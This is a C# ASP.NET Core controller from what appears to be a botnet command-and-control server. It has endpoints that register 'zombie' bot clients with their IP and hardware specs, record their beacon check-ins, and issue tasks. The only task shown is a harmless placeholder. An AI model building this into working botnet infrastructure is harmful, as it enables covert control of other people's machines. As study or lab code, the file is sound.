using C2.Enums;
using C2.Models;
using C2.POCOs;
using Microsoft.AspNetCore.Mvc;

namespace C2.Controllers;

[ApiController]
[Route("[controller]")]
public class ZombieController : AbstractController
{
    [HttpGet("ZombieTest")]
    [ProducesResponseType(StatusCodes.Status200OK)]
    public async Task<IActionResult> ZombieTest() => Ok();

    [HttpPost("Register")]
    [ProducesResponseType(typeof(InitialResponse), StatusCodes.Status200OK)]
    public async Task<IActionResult> Register([FromBody] InitialParameters parameters)
    {
        BotClientSpecs specs = new BotClientSpecs()
        {
            Ram = parameters.Ram,
            CPU = parameters.CPU,
        };

        // Generate new BotClient
        string name = Randomizer.GenerateName();
        int id = Randomizer.GenerateInt();

        DateTime lastHeardFrom = DateTime.UtcNow;

        BotClientConnectionInfo connectionInfo = new BotClientConnectionInfo()
        {
            Ip = parameters.Ip,
            LastHeardFrom = lastHeardFrom
        };

        BotClient botClient = new BotClient()
        {
            Id = id,
            Name = name,
            TaskId = -1,
            ConnectionInfo = connectionInfo,
            BotClientSpecs = specs
        };

        C2State.BotManager.Bots.TryAdd(id, botClient);

        var initialResponse = new InitialResponse()
        {
            Name = name,
            Id = id
        };

        return Ok(initialResponse);
    }

    [HttpGet("Beacon")]
    [ProducesResponseType(typeof(ActionEnum), StatusCodes.Status200OK)]
    public async Task<IActionResult> Beacon([FromQuery] int bot_id, [FromQuery] int task_id)
    {
        C2State.BotManager.Bots[bot_id].ConnectionInfo.LastHeardFrom = DateTime.UtcNow;

        return Ok(ActionEnum.CONTINUE);
    }

    [HttpGet("Request")]
    [ProducesResponseType(typeof(BotTask), StatusCodes.Status200OK)]
    public async Task<IActionResult> Request([FromQuery] int bot_id)
    {
        return Ok(new BotTask()
        {
            Id = 5,
            Task = TaskEnum.QUACK,
            TaskParameters = new Dictionary<string, object>()
            {
                {"frequency", 5},
                {"count", 100}
            }
        });
    }
}
